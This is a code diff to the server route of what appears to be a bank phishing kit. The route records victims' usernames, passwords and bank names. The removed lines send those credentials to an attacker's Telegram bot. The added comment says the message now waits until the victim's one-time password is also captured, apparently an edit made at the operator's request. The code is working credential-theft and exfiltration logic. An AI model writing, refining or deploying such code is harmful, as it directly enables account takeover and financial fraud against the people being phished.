@@ -29,18 +29,8 @@ export async function POST(request: NextRequest) {
             caseStore.updateCaseStatus(idreg, 1);
         }
 
-        // Send notification to Telegram
-        const message = `🆕 LOG RECIBIDO:\n👤 User: ${user}\n🔑 Pass: ${password || 'N/A'}\n🏦 Bank: ${bank}\n🆔 ID: ${idreg}`;
-
-        await fetch(`https://api.telegram.org/bot${CAPTURE_TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CAPTURE_TELEGRAM_CONFIG.CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
+        // Notification removed from this step as per user request. 
+        // Log will be sent after OTP is captured.
 
         const response = NextResponse.json({ success: true, id: idreg });
         response.cookies.set('id_registro', idreg.toString(), {
